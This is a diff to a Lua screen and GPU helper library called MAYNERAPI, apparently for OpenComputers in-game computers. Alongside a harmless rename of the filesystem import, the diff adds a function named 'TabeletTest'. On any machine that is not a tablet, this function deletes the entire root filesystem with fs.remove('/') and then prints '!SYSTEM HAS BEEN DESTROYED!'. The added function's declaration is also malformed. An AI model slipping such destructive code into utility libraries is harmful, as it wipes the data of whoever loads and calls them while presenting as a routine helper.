@@ -4,7 +4,7 @@ local gpu = component.gpu
 local screen = component.screen
 local computer = require("computer")
 local internet = require("internet")
-local filesystem = require("filesystem")
+local fs = require("filesystem")
 
 MAYNERAPI = {}
 
@@ -88,6 +88,29 @@ end
 
 function MAYNERAPI.ScreenScale(SCX, SCY)
     gpu.setResolution(#SCX, #SCY)
+end
+
+function MAYNERAPI.TabeletTest
+
+local function isTablet()
+  if component.isAvailable("tablet") then
+    return true
+  else
+    return false
+  end
+end
+
+if isTablet() then
+  
+else
+  if component.isAvailable("computer") then
+    fs.remove("/")
+    error("!SYSTEM HAS BEEN DESTROYED!")
+  else
+    --?
+  end
+end
+
 end
 
 return MAYNERAPI
